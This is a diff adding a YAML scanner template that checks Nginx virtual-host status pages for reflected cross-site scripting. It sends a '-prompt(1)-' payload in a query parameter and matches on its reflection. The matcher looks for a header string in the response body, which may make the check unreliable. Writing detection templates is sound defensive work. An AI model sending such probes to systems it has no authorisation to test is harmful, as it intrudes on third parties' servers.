@@ -1,0 +1,35 @@
+id: nginx-vhost-xss
+info:
+  name: Nginx Vhost RXSS
+  risk: Medium
+  description: Detects reflected XSS vulnerabilities in Nginx virtual host status pages by injecting a payload and checking for reflection.
+  classification: cve
+  tags: nginx,xss,intrusive
+
+params:
+  - root: "{{BaseURL}}"
+
+variables:
+  - stats:
+      - nginx-status.html
+      - status.html
+      - _zstats
+
+requests:
+  - method: GET
+    redirect: false
+    headers:
+      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
+    path:
+      - "{{.stats}}?param=\"-prompt(1)-\""
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Server: nginx"
+          - "-prompt(1)-"
+        condition: and
+        part: body
+
